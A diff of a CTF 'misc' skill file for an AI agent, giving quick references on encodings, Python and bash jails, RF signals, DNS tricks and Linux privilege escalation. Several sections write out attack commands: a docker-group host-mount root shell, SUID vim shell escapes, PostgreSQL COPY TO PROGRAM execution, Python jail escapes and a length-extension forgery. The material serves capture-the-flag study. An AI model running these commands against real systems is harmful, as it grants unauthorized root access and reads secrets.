@@ -1,22 +1,84 @@
 ---
 name: ctf-misc
-description: Miscellaneous CTF challenge techniques. Use for trivia, automation scripts, encoding puzzles, RF/SDR signal processing, or challenges that don't fit other categories.
-user-invocable: false
-allowed-tools: ["Bash", "Read", "Write", "Edit", "Glob", "Grep", "Task", "WebFetch", "WebSearch"]
+description: Provides miscellaneous CTF challenge techniques for problems that do not cleanly fit the main categories. Use for encoding puzzles, pyjails, bash jails, RF/SDR, DNS oddities, unicode tricks, esoteric languages, QR or audio puzzles, constraint solving, game theory, unusual sandbox escapes, and hybrid logic puzzles. Prefer a more specific skill first when the challenge is mainly web, pwn, reverse, forensics, malware, OSINT, or crypto. Treat this as the fallback skill for genuine cross-category or edge-case challenges, not the default starting point.
+license: MIT
+compatibility: Requires filesystem-based agent (Claude Code or similar) with bash, Python 3, and internet access for tool installation.
+allowed-tools: Bash Read Write Edit Glob Grep Task WebFetch WebSearch Skill
+metadata:
+  user-invocable: "false"
 ---
 
 # CTF Miscellaneous
 
-Quick reference for misc challenges. For detailed techniques, see supporting files.
+Quick reference for miscellaneous CTF challenges. Each technique has a one-liner here; see supporting files for full details.
+
+## Prerequisites
+
+**Python packages (all platforms):**
+```bash
+pip install z3-solver pwntools Pillow numpy requests dnslib
+```
+
+**Linux (apt):**
+```bash
+apt install ffmpeg qrencode
+```
+
+**macOS (Homebrew):**
+```bash
+brew install ffmpeg qrencode
+```
+
+**Manual install:**
+- SageMath — Linux: `apt install sagemath`, macOS: `brew install --cask sage`
 
 ## Additional Resources
 
-- [pyjails.md](pyjails.md) - Python jail/sandbox escape techniques
-- [bashjails.md](bashjails.md) - Bash jail/restricted shell escape techniques
-- [encodings.md](encodings.md) - Encodings, QR codes, audio, esolangs
-- RF/SDR/IQ signal processing section below covers QAM, PSK, carrier recovery, timing sync
+- [pyjails.md](pyjails.md) - Python jail/sandbox escape techniques, quine context detection, restricted character repunit decomposition, func_globals module chain traversal, restricted charset number generation, class attribute persistence, f-string config injection via stored eval
+- [bashjails.md](bashjails.md) - Bash jail/restricted shell escape techniques, HISTFILE file read trick, bash -v verbose mode, ctypes.sh direct C library calls
+- [encodings.md](encodings.md) - Encodings, QR codes, esolangs, UTF-16 tricks, BCD encoding, multi-layer auto-decoding, indexed directory QR reassembly, multi-stage URL encoding chains
+- [encodings-advanced.md](encodings-advanced.md) - Verilog/HDL, Gray code cyclic encoding, RTF custom tag extraction, SMS PDU decoding, multi-encoding sequential solvers, UTF-9, pixel binary encoding, hexadecimal Sudoku + QR assembly, TOPKEK, MaxiCode
+- [rf-sdr.md](rf-sdr.md) - RF/SDR/IQ signal processing (QAM-16, carrier recovery, timing sync)
+- [dns.md](dns.md) - DNS exploitation (ECS spoofing, NSEC walking, IXFR, rebinding, tunneling)
+- [games-and-vms.md](games-and-vms.md) - WASM patching, Roblox place file reversing, PyInstaller, marshal analysis, Python env RCE, Z3 (including boolean logic gate network SAT solving), K8s RBAC, floating-point precision exploitation, custom assembly language sandbox escape via Python MRO chain
+- [games-and-vms-2.md](games-and-vms-2.md) - Cookie checkpoint game brute-forcing, Flask cookie game state leakage, WebSocket game manipulation, server time-only validation bypass, De Bruijn sequence, Brainfuck instrumentation, WASM linear memory manipulation
+- [games-and-vms-3.md](games-and-vms-3.md) - memfd_create packed binaries, multi-phase crypto games with HMAC commitment-reveal and GF(256) Nim, emulator ROM-switching state preservation, Python marshal code injection, Benford's Law bypass, parallel connection oracle relay, nonogram solver pipelines, 100 prisoners problem, C code jail escape via emoji identifiers, BuildKit daemon build secret exploitation, Docker container escape, Levenshtein distance oracle attack, taint analysis bypass via type coercion, shredded document pixel-edge reassembly
+- [games-and-vms-4.md](games-and-vms-4.md) - Part 4 (2018-era): XSLT as Turing-complete VM, JavaScript MAX_SAFE_INTEGER successor equality, binary search oracle in comparison-only DSL, blind SQLi via script-engine timeout error, OEIS sequence lookup automation, QR code reassembly from format-string constraints, matrix exponentiation for Fibonacci recurrence, Tribonacci for frog-jump counting, Selenium + Tesseract dynamic CAPTCHA, Brainfuck→Piet multi-layer polyglot, bytebeat synth code recognition
+- [linux-privesc.md](linux-privesc.md) - Sudo wildcard parameter injection (fnmatch), crafted pcap for sudoers.d, monit confcheck process injection, Apache -d override, backup cronjob SUID, PostgreSQL COPY TO PROGRAM RCE, PostgreSQL backup credential extraction, NFS share exploitation, SSH Unix socket tunneling, PaperCut Print Deploy privesc, Squid proxy pivoting, Zabbix admin password reset via MySQL, WinSSHTerm credential decryption
+- [ctfd-navigation.md](ctfd-navigation.md) - CTFd platform API navigation without browser: detection, token auth, challenge listing, file download, flag submission, scoreboard, hints, notifications, Python client class
 
 ---
+
+## When to Pivot
+
+- If the puzzle is actually centered on cryptography or number theory, switch to `/ctf-crypto`.
+- If the challenge is a real binary exploit instead of a jail, toy VM, or encoding problem, switch to `/ctf-pwn` or `/ctf-reverse`.
+- If the input is mostly files, images, audio, or packet captures that need recovery work first, switch to `/ctf-forensics`.
+- For ML/AI techniques (model attacks, adversarial examples, LLM jailbreaking), see `/ctf-ai-ml`.
+
+## Quick Start Commands
+
+```bash
+# File identification
+file mystery_file
+xxd mystery_file | head -5
+python3 -c "import magic; print(magic.from_file('mystery_file'))"
+
+# Encoding detection
+python3 -c "import base64; print(base64.b64decode('<data>'))"
+echo '<data>' | base64 -d
+echo '<hex>' | xxd -r -p
+
+# QR code
+zbarimg qr.png
+python3 -c "from pyzbar.pyzbar import decode; from PIL import Image; print(decode(Image.open('qr.png')))"
+
+# Z3 constraint solving
+python3 -c "from z3 import *; x=BitVec('x',32); s=Solver(); s.add(x^0xdead==0xbeef); s.check(); print(s.model())"
+
+# Python jail test
+python3 -c "__import__('os').system('id')"
+```
 
 ## General Tips
 
@@ -46,66 +108,28 @@ echo "uryyb" | tr 'a-zA-Z' 'n-za-mN-ZA-M'
 - Base32: `A-Z2-7=` (no lowercase)
 - Hex: `0-9a-fA-F`
 
+See [encodings.md](encodings.md) for Caesar brute force, URL encoding, and full details.
+
 ## IEEE-754 Float Encoding (Data Hiding)
 
 **Pattern (Floating):** Numbers are float32 values hiding raw bytes.
 
-**Key insight:** A 32-bit float is just 4 bytes interpreted as a number. Reinterpret as raw bytes → ASCII.
+**Key insight:** A 32-bit float is just 4 bytes interpreted as a number. Reinterpret as raw bytes -> ASCII.
 
 ```python
 import struct
-
-# List of suspicious floating-point numbers
 floats = [1.234e5, -3.456e-7, ...]  # Whatever the challenge gives
-
-# Convert each float to 4 raw bytes (big-endian)
 flag = b''
 for f in floats:
     flag += struct.pack('>f', f)
 print(flag.decode())
 ```
 
-**CyberChef solution:**
-1. Paste numbers (space-separated)
-2. "From Float" → Big Endian → Float (4 bytes) → Space delimiter
-
-**Variations:**
-- Double (8 bytes): `struct.pack('>d', val)`
-- Little-endian: `struct.pack('<f', val)`
-- Mixed endianness: try both if first doesn't produce ASCII
+**Variations:** Double `'>d'`, little-endian `'<f'`, mixed. See [encodings.md](encodings.md) for CyberChef recipe.
 
 ## USB Mouse PCAP Reconstruction
 
-**Pattern (Hunt and Peck):** USB HID mouse traffic captures on-screen keyboard typing.
-
-**Workflow:**
-1. Open PCAP in Wireshark — identify USBPcap with HID interrupt transfers
-2. Identify device (Device Descriptor → manufacturer/product)
-3. Use USB-Mouse-Pcap-Visualizer: `github.com/WangYihang/USB-Mouse-Pcap-Visualizer`
-4. Extract click coordinates (falling edges of `left_button_holding`)
-5. Plot clicks on scatter plot with matplotlib
-6. Overlay on image of Windows On-Screen Keyboard
-7. Animate clicks in order to read typed text
-
-**Key details:**
-- Mouse reports **relative** coordinates (deltas), not absolute
-- Cumulative sum of deltas gives position track
-- Rising/falling edges of button state = click start/end
-- Need to scale/stretch overlay to match OSK layout
-
-```python
-import pandas as pd
-import matplotlib.pyplot as plt
-
-df = pd.read_csv('mouse_data.csv')
-# Find click positions (falling edges)
-clicks = df[df['left_button_holding'].shift(1) == True & (df['left_button_holding'] == False)]
-# Cumulative position from relative deltas
-x_pos = df['x'].cumsum()
-y_pos = df['y'].cumsum()
-# Plot clicks over OSK image
-plt.scatter(click_x, click_y, c='red', s=50)
-```
+**Pattern (Hunt and Peck):** USB HID mouse traffic captures on-screen keyboard typing. Use USB-Mouse-Pcap-Visualizer, extract click coordinates (falling edges), cumsum relative deltas for absolute positions, overlay on OSK image.
 
 ## File Type Detection
 
@@ -138,6 +162,12 @@ zbarimg qrcode.png       # Decode
 qrencode -o out.png "data"
 ```
 
+**MaxiCode barcode:** Hexagonal 2D barcode with bullseye center; decode with `zxing` (Java) since standard QR decoders fail. See [encodings-advanced.md](encodings-advanced.md#maxicode-2d-barcode-decoding-csaw-ctf-2016).
+
+**TOPKEK encoding:** CTF-specific binary encoding where `KEK=0`, `TOP=1`, `!` suffix = repeat count. See [encodings-advanced.md](encodings-advanced.md#topkek-binary-encoding-hack-the-vote-2016).
+
+See [encodings.md](encodings.md) for QR structure, repair techniques, chunk reassembly (structural and indexed-directory variants), and multi-stage URL encoding chains.
+
 ## Audio Challenges
 
 ```bash
@@ -147,93 +177,12 @@ qsstv                          # SSTV decoder
 
 ## RF / SDR / IQ Signal Processing
 
-### IQ File Formats
-- **cf32** (complex float 32): GNU Radio standard, `np.fromfile(path, dtype=np.complex64)`
-- **cs16** (complex signed 16-bit): `np.fromfile(path, dtype=np.int16).reshape(-1,2)`, then `I + jQ`
-- **cu8** (complex unsigned 8-bit): RTL-SDR raw format
+See [rf-sdr.md](rf-sdr.md) for full details (IQ formats, QAM-16 demod, carrier/timing recovery).
 
-### Analysis Pipeline
-```python
-import numpy as np
-from scipy import signal
-
-# 1. Load IQ data
-iq = np.fromfile('signal.cf32', dtype=np.complex64)
-
-# 2. Spectrum analysis - find occupied bands
-fft_data = np.fft.fftshift(np.fft.fft(iq[:4096]))
-freqs = np.fft.fftshift(np.fft.fftfreq(4096))
-power_db = 20*np.log10(np.abs(fft_data)+1e-10)
-
-# 3. Identify symbol rate via cyclostationary analysis
-x2 = np.abs(iq_filtered)**2  # squared magnitude
-fft_x2 = np.abs(np.fft.fft(x2, n=65536))
-# Peak in fft_x2 = symbol rate (samples_per_symbol = 1/peak_freq)
-
-# 4. Frequency shift to baseband
-center_freq = 0.14  # normalized frequency of band center
-t = np.arange(len(iq))
-baseband = iq * np.exp(-2j * np.pi * center_freq * t)
-
-# 5. Low-pass filter to isolate band
-lpf = signal.firwin(101, bandwidth/2, fs=1.0)
-filtered = signal.lfilter(lpf, 1.0, baseband)
-```
-
-### QAM-16 Demodulation with Carrier + Timing Recovery
-The key challenge is carrier frequency offset causing constellation rotation (circles instead of points).
-
-**Decision-directed carrier recovery + Mueller-Muller timing:**
-```python
-# Loop parameters (2nd order PLL)
-carrier_bw = 0.02  # wider BW = faster tracking, more noise
-damping = 1.0
-theta_n = carrier_bw / (damping + 1/(4*damping))
-Kp = 2 * damping * theta_n      # proportional gain
-Ki = theta_n ** 2                # integral gain
-
-carrier_phase = 0.0
-carrier_freq = 0.0
-
-for each symbol sample:
-    # De-rotate by current phase estimate
-    symbol = raw_sample * np.exp(-1j * carrier_phase)
-
-    # Find nearest constellation point (decision)
-    nearest = min(constellation, key=lambda p: abs(symbol - p))
-
-    # Phase error (decision-directed)
-    error = np.imag(symbol * np.conj(nearest)) / (abs(nearest)**2 + 0.1)
-
-    # Update 2nd order loop
-    carrier_freq += Ki * error
-    carrier_phase += Kp * error + carrier_freq
-```
-
-**Mueller-Muller timing error detector:**
-```python
-timing_error = (Re(y[n]-y[n-1]) * Re(d[n-1]) - Re(d[n]-d[n-1]) * Re(y[n-1]))
-             + (Im(y[n]-y[n-1]) * Im(d[n-1]) - Im(d[n]-d[n-1]) * Im(y[n-1]))
-# y = received symbol, d = decision (nearest constellation point)
-```
-
-### Key Insights for RF CTF Challenges
-- **Circles in constellation** = frequency offset not corrected
-- **Spirals** = frequency offset + time-varying phase
-- **Blobs on grid** = correct sync, just noise
-- **4-fold ambiguity**: DD carrier recovery can lock with 0°/90°/180°/270° rotation — try all 4
-- **Bandwidth vs symbol rate**: BW = Rs × (1 + α), where α is roll-off factor (0 to 1)
-- **RC vs RRC**: "RC pulse shaping" at TX means receiver just samples (no matched filter needed); "RRC" means apply matched RRC filter at RX
-- **Cyclostationary peak at Rs** confirms symbol rate even without knowing modulation order
-- **AGC**: normalize signal power to match constellation power: `scale = sqrt(target_power / measured_power)`
-- **GNU Radio's QAM-16 default mapping** is NOT Gray code — always check the provided constellation map
-
-### Common Framing Patterns
-- Idle/sync pattern repeating while link is idle
-- Start delimiter (often a single symbol like 0)
-- Data payload (nibble pairs for QAM-16: high nibble first, low nibble)
-- End delimiter (same as start, e.g., 0)
-- The idle pattern itself may contain the delimiter value — distinguish by context (is it part of the 16-symbol repeating pattern?)
+**Quick reference:**
+- **cf32**: `np.fromfile(path, dtype=np.complex64)` | **cs16**: int16 reshape(-1,2) | **cu8**: RTL-SDR raw
+- Circles in constellation = constant frequency offset; Spirals = drifting frequency + gain instability
+- 4-fold ambiguity in DD carrier recovery - try 0/90/180/270 rotation
 
 ## pwntools Interaction
 
@@ -248,172 +197,170 @@ r.interactive()
 
 ## Python Jail Quick Reference
 
-**Enumerate functions:**
-```python
-for c in string.printable:
-    result = test(f"{c}()")
-    if "error" not in result.lower():
-        print(f"Found: {c}()")
-```
+- **Oracle pattern:** `L()` = length, `Q(i,x)` = compare, `S(guess)` = submit. Linear or binary search.
+- **Walrus bypass:** `(abcdef := "new_chars")` reassigns constraint vars
+- **Decorator bypass:** `@__import__` + `@func.__class__.__dict__[__name__.__name__].__get__` for no-call, no-quotes escape
+- **String join:** `open(''.join(['fl','ag.txt'])).read()` when `+` is blocked
 
-**Oracle pattern (L, Q, S functions):**
-```python
-flag_len = int(test("L()"))
-for i in range(flag_len):
-    for c in range(32, 127):
-        if query(i, c) == 0:
-            flag += chr(c)
-            break
-```
+See [pyjails.md](pyjails.md) for full techniques.
 
-**Bypass character restrictions:**
-```python
-# Walrus operator
-(abcdef := "new_allowed_chars")
-
-# Octal escapes
-'\\141' = 'a'
-```
-
-**Decorator bypass (ast.Call banned, no quotes, no `=`):**
-```python
-# Decorators = function calls + assignment without ast.Call or =
-# function.__name__ = strings without quotes
-# See pyjails.md "Decorator-Based Escape" for full technique
-@__import__
-@func.__class__.__dict__[__name__.__name__].__get__  # name extractor
-def os():
-    0
-# Result: os = __import__("os")
-```
-
-## Z3 Constraint Solving
+## Z3 / Constraint Solving
 
 ```python
 from z3 import *
-
 flag = [BitVec(f'f{i}', 8) for i in range(FLAG_LEN)]
 s = Solver()
-s.add(flag[0] == ord('f'))  # Known prefix
-# Add constraints...
-if s.check() == sat:
-    print(bytes([s.model()[f].as_long() for f in flag]))
+# Add constraints, check sat, extract model
 ```
+
+See [games-and-vms.md](games-and-vms.md) for YARA rules, type systems as constraints, boolean logic gate network SAT solving.
 
 ## Hash Identification
 
-**By constants:**
-- MD5: `0x67452301`
-- SHA-256: `0x6a09e667`
-- MurmurHash64A: `0xC6A4A7935BD1E995`
+MD5: `0x67452301` | SHA-256: `0x6a09e667` | MurmurHash64A: `0xC6A4A7935BD1E995`
 
-## PyInstaller Extraction
+## SHA-256 Length Extension Attack
+
+MAC = `SHA-256(SECRET || msg)` with known msg/hash -> forge valid MAC via `hlextend`. Vulnerable: SHA-256, MD5, SHA-1. NOT: HMAC, SHA-3.
+
+```python
+import hlextend
+sha = hlextend.new('sha256')
+new_data = sha.extend(b'extension', b'original_message', len_secret, known_hash_hex)
+```
+
+## Technique Quick References
+
+- **PyInstaller:** `pyinstxtractor.py packed.exe`. See [games-and-vms.md](games-and-vms.md) for opcode remapping.
+- **Marshal:** `marshal.load(f)` then `dis.dis(code)`. See [games-and-vms.md](games-and-vms.md).
+- **Python env RCE:** `PYTHONWARNINGS=ignore::antigravity.Foo::0` + `BROWSER="cmd"`. See [games-and-vms.md](games-and-vms.md).
+- **WASM patching:** `wasm2wat` -> flip minimax -> `wat2wasm`. See [games-and-vms.md](games-and-vms.md).
+- **Float precision:** Large multipliers amplify FP errors into exploitable fractions. See [games-and-vms.md](games-and-vms.md).
+- **K8s RBAC bypass:** SA token -> impersonate -> hostPath mount -> read secrets. See [games-and-vms.md](games-and-vms.md).
+- **Cookie checkpoint:** Save session cookies before guesses, restore on failure to brute-force without reset. See [games-and-vms-2.md](games-and-vms-2.md).
+- **Flask cookie game state:** `flask-unsign -d -c '<cookie>'` decodes unsigned Flask sessions, leaking game answers. See [games-and-vms-2.md](games-and-vms-2.md).
+- **WebSocket teleport:** Modify `player.x`/`player.y` in console, call verification function. See [games-and-vms-2.md](games-and-vms-2.md).
+- **Time-only validation:** Start session, `time.sleep(required_seconds)`, submit win. See [games-and-vms-2.md](games-and-vms-2.md).
+- **Quine context detection:** Dual-purpose quine that prints itself (passes validation) and runs payload only in server process via globals gate. See [pyjails.md](pyjails.md).
+- **Repunit decomposition:** Decompose target integer into sum of repunits (1, 11, 111, ...) using only 2 characters (`1` and `+`) for restricted eval. See [pyjails.md](pyjails.md).
+- **De Bruijn sequence:** B(k, n) contains all k^n possible n-length strings as substrings; linearize by appending first n-1 chars. See [games-and-vms-2.md](games-and-vms-2.md).
+- **Brainfuck instrumentation:** Instrument BF interpreter to track tape cells, brute-force flag character-by-character via validation cell. See [games-and-vms-2.md](games-and-vms-2.md).
+- **WASM memory manipulation:** Patch WASM linear memory at runtime to set game state variables directly, bypassing game logic. See [games-and-vms-2.md](games-and-vms-2.md).
+- **Lua sandbox escape:** Bypass `load()`/`os.execute()` filters via `os["execute"]` table indexing or `loadstring` alias. See [games-and-vms.md](games-and-vms.md#lua-sandbox-escape-via-function-name-injection-csaw-ctf-2016).
+- **C code jail via emoji + gadget embedding:** When only emoji and punctuation are allowed in C, use `(😃==😃)` as constant 1, build integers, embed gadgets in `add eax, imm32` constants, jump to offset+1 for shellcode primitives. See [games-and-vms-3.md](games-and-vms-3.md#c-code-jail-escape-via-emoji-identifiers-and-gadget-embedding-midnight-flag-2026).
+- **Emulator ROM-switching:** `/load` replaces ROM but preserves CPU state (registers, RAM, PC). Switch ROMs at specific PCs to combine INIT from one ROM with display instructions from another → read protected memory. See [games-and-vms-3.md](games-and-vms-3.md#emulator-rom-switching-state-preservation-bsidessf-2026).
+- **BuildKit daemon exploitation:** Exposed BuildKit gRPC allows nested `buildctl build` with `--mount=type=secret` to read build secrets. Two-stage Dockerfile: install buildctl → submit nested build mounting flag secret. See [games-and-vms-3.md](games-and-vms-3.md#buildkit-daemon-exploitation-for-build-secrets-bsidessf-2026).
+- **Docker container escape:** Privileged breakout via host device mount, docker.sock socket escape, CAP_SYS_ADMIN cgroup release_agent, container info leakage via /proc and overlayfs. See [games-and-vms-3.md](games-and-vms-3.md#docker-container-escape-techniques).
+- **Taint analysis bypass via type coercion:** In custom ML-like languages with secrecy/taint systems, if-expression secrecy depends on return type not condition — coerce side-effecting functions to private type to leak private data through public mutable refs. See [games-and-vms-3.md](games-and-vms-3.md#taint-analysis-bypass-in-custom-language-via-type-coercion-plaidctf-2018).
+- **Shredded document pixel-edge reassembly:** Encode each strip's left/right edge as binary bitmask (dark=1), use XOR + popcount Hamming distance to greedily place strips by minimum edge distance for sub-second reassembly. See [games-and-vms-3.md](games-and-vms-3.md#shredded-document-pixel-edge-reassembly-under-time-pressure-nuit-du-hack-ctf-2018).
+- **f-string config injection via stored eval:** Store payload as config value, create key named `eval(stored_key)` — f-string rendering evaluates the key name expression, triggering RCE. See [pyjails.md](pyjails.md#python-f-string-config-injection-via-stored-eval-inshack-2018).
+- **Hexadecimal Sudoku + QR assembly:** 4 QR codes encode 16x16 hex Sudoku quadrants; solve grid, read diagonal as hex pairs → ASCII flag. See [encodings-advanced.md](encodings-advanced.md#hexadecimal-sudoku--qr-assembly-bsidessf-2026).
+- **Z3 boolean gate network SAT solving:** Product key validation as 250 boolean gates (AND/OR/XOR/NOT) over 125 input bits. Model each gate as Z3 constraint, require all outputs True, solve in milliseconds. See [games-and-vms.md](games-and-vms.md#z3-sat-solving-for-boolean-logic-gate-networks-bsidessf-2026).
+
+## 3D Printer Video Nozzle Tracking (LACTF 2026)
+
+**Pattern (flag-irl):** Video of 3D printer fabricating nameplate. Flag is the printed text.
+
+**Technique:** Track nozzle X/Y positions from video frames, filter for print moves (top/text layer only), plot 2D histogram to reveal letter shapes:
+```python
+# 1. Identify text layer frames (e.g., frames 26100-28350)
+# 2. Track print head X position (physical X-axis)
+# 3. Track bed X position (physical Y-axis from camera angle)
+# 4. Filter for moves with extrusion (head moving while printing)
+# 5. Plot as 2D scatter/histogram -> letters appear
+```
+
+## Discord API Enumeration (0xFun 2026)
+
+Flags hidden in Discord metadata (roles, animated emoji, embeds). Invoke `/ctf-osint` for Discord API enumeration technique and code (see social-media.md in ctf-osint).
+
+---
+
+## SUID Binary Exploitation (0xFun 2026)
 
 ```bash
-python pyinstxtractor.py packed.exe
-# Look in packed.exe_extracted/
+# Find SUID binaries
+find / -perm -4000 2>/dev/null
+
+# Cross-reference with GTFObins
+# xxd with SUID: xxd flag.txt | xxd -r
+# vim with SUID: vim -c ':!cat /flag.txt'
 ```
 
-## Marshal Code Analysis
+**Reference:** https://gtfobins.github.io/
 
-```python
-import marshal, dis
-with open('file.bin', 'rb') as f:
-    code = marshal.load(f)
-dis.dis(code)
-```
+---
 
-## Python Environment RCE
+## Linux Privilege Escalation Quick Checks
 
 ```bash
-PYTHONWARNINGS=ignore::antigravity.Foo::0
-BROWSER="/bin/sh -c 'cat /flag' %s"
+# GECOS field passwords
+cat /etc/passwd  # Check 5th colon-separated field
+
+# ACL permissions
+getfacl /path/to/restricted/file
+
+# Sudo permissions
+sudo -l
+
+# Docker group membership (instant root)
+id | grep -q docker && docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
 ```
 
-## Floating-Point Precision Exploitation
+## Docker Group Privilege Escalation (H7CTF 2025)
 
-**Pattern (Spare Me Some Change):** Trading/economy games where large multipliers amplify tiny floating-point errors.
+User in the `docker` group can mount the host filesystem into a container and chroot into it for root access.
 
-**Key insight:** When decimal values (0.01-0.99) are multiplied by large numbers (e.g., 1e15), floating-point representation errors create fractional remainders that can be exploited.
+```bash
+# Check group membership
+id  # Look for "docker" in groups
 
-### Finding Exploitable Values
-```python
-mult = 1000000000000000  # 10^15
+# Mount host root filesystem and chroot
+docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
 
-# Find values where multiplication creates useful fractional errors
-for i in range(1, 100):
-    x = i / 100.0
-    result = x * mult
-    frac = result - int(result)
-    if frac > 0:
-        print(f'x={x}: {result} (fraction={frac})')
-
-# Common values with positive fractions:
-# 0.07 → 70000000000000.0078125
-# 0.14 → 140000000000000.015625
-# 0.27 → 270000000000000.03125
-# 0.56 → 560000000000000.0625
+# Now running as root on the host filesystem
+cat /root/flag.txt
 ```
 
-### Exploitation Strategy
-1. **Identify the constraint**: Need `balance >= price` AND `inventory >= fee`
-2. **Find favorable FP error**: Value where `x * mult` has positive fraction
-3. **Key trick**: Sell the INTEGER part of inventory, keeping the fractional "free money"
+**Key insight:** Docker group membership is equivalent to root access. The `docker` CLI socket (`/var/run/docker.sock`) allows creating privileged containers that mount the entire host filesystem.
 
-**Example (time-travel trading game):**
+**Reference:** https://gtfobins.github.io/gtfobins/docker/
+
+## Sudo Wildcard Parameter Injection (Dump HTB)
+
+Sudo's `fnmatch()` matches `*` across argument boundaries. Inject extra flags (`-Z root`, `-r`, second `-w`) into locked-down commands. Craft pcap with embedded valid sudoers entries — sudo's parser recovers from binary junk, unlike cron's strict parser. See [linux-privesc.md](linux-privesc.md#sudo-wildcard-parameter-injection-via-fnmatch-dump-htb).
+
+## Monit Process Command-Line Injection (Zero HTB)
+
+Root monit script uses `pgrep -lfa` to extract process command lines, then executes a modified version. Create fake process via `perl -e '$0 = "..."'` with injected flags. Apache `-d` last-wins overrides ServerRoot; `-E` captures error output. `Include /root/flag` causes a parse error that reveals the file content. See [linux-privesc.md](linux-privesc.md#monit-confcheck-process-command-line-injection-zero-htb).
+
+## PostgreSQL RCE and File Read (Slonik HTB)
+
+`COPY (SELECT '') TO PROGRAM 'cmd'` executes OS commands as postgres. `pg_read_file('/path')` reads files. Extract credentials from `pg_basebackup` archives (`global/1260` = `pg_authid`). SSH tunnel to Unix sockets: `ssh -fNL 25432:/var/run/postgresql/.s.PGSQL.5432`. See [linux-privesc.md](linux-privesc.md#postgresql-copy-to-program-rce-slonik-htb).
+
+## Backup Cronjob SUID Abuse (Slonik HTB)
+
+Root cronjob copying directories preserves SUID bit but changes ownership to root. Place SUID bash in source directory → backup copies it as root-owned SUID. Execute with `bash -p`. See [linux-privesc.md](linux-privesc.md#backup-cronjob-suid-abuse-slonik-htb).
+
+## PaperCut Print Deploy Privesc (Bamboo HTB)
+
+Root process runs scripts from user-owned directory. Modify `server-command`, trigger via Mobility Print API refresh. See [linux-privesc.md](linux-privesc.md#papercut-print-deploy-privilege-escalation-bamboo-htb).
+
+---
+
+## CTFd Platform Navigation (No Browser)
+
+Detect CTFd (`curl -s "$CTF_URL/api/v1/" | head -5`) and interact via API. **Ask the user for their API token** (CTFd Settings > Access Tokens) — it is not provided by default. Then use `Authorization: Token $CTF_TOKEN` header for all requests.
+
+```bash
+export CTF_URL="https://ctf.example.com" CTF_TOKEN="ctfd_your_token_here"
+curl -s -H "Authorization: Token $CTF_TOKEN" "$CTF_URL/api/v1/challenges" | jq -r '.data[] | "\(.id)\t\(.value)pts\t\(.category)\t\(.name)"'
+curl -s -X POST -H "Authorization: Token $CTF_TOKEN" -H "Content-Type: application/json" "$CTF_URL/api/v1/challenges/attempt" -d "{\"challenge_id\": $CID, \"submission\": \"flag{...}\"}"
 ```
-Initial: balance=5.00, inventory=0.00, flag_price=5.00, fee=0.05
-Multiplier: 1e15 (time travel)
 
-# Buy 0.56, travel through time:
-balance = (5.0 - 0.56) * 1e15 = 4439999999999999.5
-inventory = 0.56 * 1e15 = 560000000000000.0625
+See [ctfd-navigation.md](ctfd-navigation.md) for full workflow, Python client class, session login, hints, notifications, file download, and troubleshooting.
 
-# Sell exactly 560000000000000 (integer part):
-balance = 4439999999999999.5 + 560000000000000 = 5000000000000000.0 (FP rounds!)
-inventory = 560000000000000.0625 - 560000000000000 = 0.0625 > 0.05 fee ✓
-
-# Now: balance >= flag_price ✓ AND inventory >= fee ✓
-```
-
-### Why It Works
-- Float64 has ~15-16 significant digits precision
-- `(5.0 - 0.56) * 1e15` loses precision → rounds to exact 5e15 when added
-- `0.56 * 1e15` keeps the 0.0625 fraction as "free inventory"
-- The asymmetric rounding gives you slightly more total value than you started with
-
-### Red Flags in Challenges
-- "Time travel amplifies everything" (large multipliers)
-- Trading games with buy/sell + special actions
-- Decimal currency with fees or thresholds
-- "No decimals allowed" after certain operations (forces integer transactions)
-- Starting values that seem impossible to win with normal math
-
-### Quick Test Script
-```python
-def find_exploit(mult, balance_needed, inventory_needed):
-    """Find x where selling int(x*mult) gives balance>=needed with inv>=needed"""
-    for i in range(1, 500):
-        x = i / 100.0
-        if x >= 5.0:  # Can't buy more than balance
-            break
-        inv_after = x * mult
-        bal_after = (5.0 - x) * mult
-
-        # Sell integer part of inventory
-        sell = int(inv_after)
-        final_bal = bal_after + sell
-        final_inv = inv_after - sell
-
-        if final_bal >= balance_needed and final_inv >= inventory_needed:
-            print(f'EXPLOIT: buy {x}, sell {sell}')
-            print(f'  final_balance={final_bal}, final_inventory={final_inv}')
-            return x
-    return None
-
-# Example usage:
-find_exploit(1e15, 5e15, 0.05)  # Returns 0.56
-```
+---
 
 ## Useful One-Liners
 
@@ -453,32 +400,72 @@ print(flag)
 
 **CyberChef:** "From Decimal" recipe with line feed delimiter.
 
-## Python Jail: String Join Bypass
-
-**Pattern (better_eval):** `+` operator blocked for string concatenation.
-
-**Bypass with `''.join()`:**
-```python
-# Blocked: "fl" + "ag.txt"
-# Allowed: ''.join(["fl","ag.txt"])
-
-# Full payload:
-open(''.join(['fl','ag.txt'])).read()
-```
-
-**Other bypass techniques:**
-- `chr()` + list comprehension: `''.join([chr(102),chr(108),chr(97),chr(103)])`
-- Format strings: `f"{'flag'}.txt"` (if f-strings allowed)
-- `bytes([102,108,97,103]).decode()` for "flag"
-
 ## Backdoor Detection in Source Code
 
 **Pattern (Rear Hatch):** Hidden command prefix triggers `system()` call.
 
 **Common patterns:**
-- `strncmp(input, "exec:", 5)` → runs `system(input + 5)`
+- `strncmp(input, "exec:", 5)` -> runs `system(input + 5)`
 - Hex-encoded comparison strings: `\x65\x78\x65\x63\x3a` = "exec:"
 - Hidden conditions in maintenance/admin functions
+
+## DNS Exploitation Techniques
+
+See [dns.md](dns.md) for full details (ECS spoofing, NSEC walking, IXFR, rebinding, tunneling).
+
+**Quick reference:**
+- **ECS spoofing**: `dig @server flag.example.com TXT +subnet=10.13.37.1/24` - try leet-speak IPs (1337)
+- **NSEC walking**: Follow NSEC chain to enumerate DNSSEC zones
+- **IXFR**: `dig @server domain IXFR=0` when AXFR is blocked
+- **DNS rebinding**: Low-TTL alternating resolution to bypass same-origin
+- **DNS tunneling**: Data exfiltrated via subdomain queries or TXT responses
+
+## Unicode Steganography
+
+### Variation Selectors Supplement (U+E0100-U+E01EF)
+**Patterns (Seen & emoji, Nullcon 2026):** Invisible Variation Selector Supplement characters encode ASCII via codepoint offset.
+
+```python
+# Extract hidden data from variation selectors after visible character
+data = open('README.md', 'r').read().strip()
+hidden = data[1:]  # Skip visible emoji character
+flag = ''.join(chr((ord(c) - 0xE0100) + 16) for c in hidden)
+```
+
+**Detection:** Characters appear invisible but have non-zero length. Check with `[hex(ord(c)) for c in text]` -- look for codepoints in `0xE0100-0xE01EF` or `0xFE00-0xFE0F` range.
+
